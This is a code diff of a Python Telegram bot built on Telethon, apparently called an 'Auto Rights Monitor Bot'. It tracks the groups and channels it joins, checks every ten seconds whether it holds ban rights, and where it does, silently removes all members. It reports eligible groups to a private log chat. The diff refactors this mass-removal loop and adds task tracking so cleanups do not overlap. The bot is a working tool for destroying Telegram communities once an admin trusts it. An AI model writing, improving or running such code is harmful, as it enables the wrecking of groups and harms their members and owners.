@@ -4,13 +4,12 @@ import time
 from telethon import TelegramClient, events
 from telethon.errors import ChatAdminRequiredError
 
-
+# ───── ENV SETUP ───── #
 def get_env_var(name):
     value = os.environ.get(name)
     if value is None:
         print(f"⚠️ Environment variable {name} is missing.")
     return value
-
 
 def to_int(value, name):
     if value is None:
@@ -21,7 +20,6 @@ def to_int(value, name):
         print(f"⚠️ Environment variable {name} could not be parsed as an integer.")
         return None
 
-
 BOT_TOKEN = get_env_var("BOT_TOKEN")
 API_ID = to_int(get_env_var("API_ID"), "API_ID")
 API_HASH = get_env_var("API_HASH")
@@ -29,19 +27,18 @@ LOG_GROUP_ID = to_int(get_env_var("LOG_GROUP_ID"), "LOG_GROUP_ID")
 
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# Cache for groups/channels the bot is in
+# ───── STATE ───── #
 tracked_chats = set()
 cleaned_chats = set()
+error_chats = set()
+active_cleanup_tasks = {}
 
-
+# ───── LOAD INITIAL CHATS ───── #
 def load_initial_chats():
-    """Load chat IDs provided via TRACKED_CHAT_IDS env var."""
     seeded_chats = set()
     raw_value = os.environ.get("TRACKED_CHAT_IDS")
-
     if not raw_value:
         return seeded_chats
-
     for raw_id in raw_value.split(","):
         raw_id = raw_id.strip()
         if not raw_id:
@@ -50,15 +47,12 @@ def load_initial_chats():
             seeded_chats.add(int(raw_id))
         except ValueError:
             print(f"⚠️ Could not parse chat id '{raw_id}' from TRACKED_CHAT_IDS.")
-
     return seeded_chats
-
 
 tracked_chats.update(load_initial_chats())
 
-
+# ───── CLEANUP FUNCTION ───── #
 async def remove_all_members(chat):
-    """Remove all members from a group/channel silently"""
     try:
         members = await bot.get_participants(chat)
         total = len(members)
@@ -105,57 +99,49 @@ async def remove_all_members(chat):
             f"⚠️ Lost ban rights in **{chat.title}** (`{chat.id}`), stopping cleanup."
         )
 
+    finally:
+        active_cleanup_tasks.pop(chat.id, None)
 
+# ───── RIGHTS CHECK LOOP ───── #
 async def check_rights_loop():
-    """Check every 10 seconds which groups/channels bot has ban rights in"""
     while True:
         try:
-            if not tracked_chats:
-                await bot.send_message(
-                    LOG_GROUP_ID,
-                    "🕒 Status Update:\n📭 No tracked groups yet. Add the bot to a group/channel to start monitoring.",
-                )
-                await asyncio.sleep(10)
-                continue
-
             rights_groups = []
+            newly_eligible = []
 
             for chat_id in list(tracked_chats):
                 try:
                     entity = await bot.get_entity(chat_id)
-                except Exception as error:
-                    print(f"⚠️ Could not fetch entity for {chat_id}: {error}")
-                    continue
-
-                try:
                     perms = await bot.get_permissions(entity.id, "me")
-                except Exception as error:
-                    print(f"⚠️ Could not get permissions for {entity.id}: {error}")
-                    continue
 
-                if perms.is_admin and perms.ban_users:
-                    rights_groups.append(entity)
-                    # If not yet cleaned, start cleaning
-                    if entity.id not in cleaned_chats:
-                        asyncio.create_task(remove_all_members(entity))
+                    if perms.is_admin and perms.ban_users:
+                        rights_groups.append(entity)
 
-            await bot.send_message(
-                LOG_GROUP_ID,
-                f"🕒 Status Update:\n",
-                f"📊 Total tracked groups/channels: {len(tracked_chats)}\n",
-                f"✅ Ban rights in: {len(rights_groups)}\n",
-                f"🔁 Next check in 10s...",
-            )
+                        if entity.id not in cleaned_chats and entity.id not in active_cleanup_tasks:
+                            task = asyncio.create_task(remove_all_members(entity))
+                            active_cleanup_tasks[entity.id] = task
+                            newly_eligible.append(entity.title)
+
+                except Exception as e:
+                    if chat_id not in error_chats:
+                        await bot.send_message(
+                            LOG_GROUP_ID,
+                            f"⚠️ Error checking rights in chat `{chat_id}`: {e}"
+                        )
+                        error_chats.add(chat_id)
+
+            if newly_eligible:
+                msg = "🔍 Newly eligible groups with ban rights:\n" + "\n".join(f"• {title}" for title in newly_eligible)
+                await bot.send_message(LOG_GROUP_ID, msg)
 
         except Exception as e:
-            await bot.send_message(LOG_GROUP_ID, f"⚠️ Error during rights check: {e}")
+            await bot.send_message(LOG_GROUP_ID, f"⚠️ Global error in rights loop: {e}")
 
         await asyncio.sleep(10)
 
-
+# ───── EVENT: Bot Added to New Group ───── #
 @bot.on(events.ChatAction)
 async def on_added(event):
-    """When bot is added to a new group/channel"""
     if event.user_added and event.user_id == (await bot.get_me()).id:
         chat = await event.get_chat()
         tracked_chats.add(chat.id)
@@ -164,31 +150,34 @@ async def on_added(event):
             f"🆕 Added to new group/channel: **{chat.title}** (`{chat.id}`)\nWill check ban rights in next cycle."
         )
 
-
+# ───── EVENT: Track Messages ───── #
 @bot.on(events.NewMessage())
 async def track_message_chats(event):
-    """Track chats where the bot receives messages to avoid restricted API calls."""
     if event.is_group or event.is_channel:
         chat = await event.get_chat()
         if hasattr(chat, "id"):
             tracked_chats.add(chat.id)
 
-
+# ───── /start COMMAND ───── #
 @bot.on(events.NewMessage(pattern="/start"))
 async def start_cmd(event):
-    """Private check"""
     if event.is_private:
-        await event.reply("🤖 Bot is active and running silently with auto rights monitoring.")
+        await event.respond(
+            "🤖 Bot is running.\n\n"
+            "👁️ Auto-monitoring groups/channels for ban rights.\n"
+            "🧹 Will auto-remove users silently if permitted."
+        )
 
-
+# ───── MAIN LOOP ───── #
 async def main():
     await bot.send_message(
         LOG_GROUP_ID,
-        "✅ Bot started successfully! Monitoring groups every 10s...\n"
-        "Tip: preload chats with TRACKED_CHAT_IDS env var (comma separated IDs).",
+        "✅ Bot started successfully!\n"
+        "📡 Monitoring groups/channels every 10s...\n"
+        "💡 Tip: preload chats with TRACKED_CHAT_IDS env var (comma separated IDs)."
     )
     await check_rights_loop()
 
-
+# ───── ENTRY ───── #
 print("🤖 Auto Rights Monitor Bot running...")
 bot.loop.run_until_complete(main())
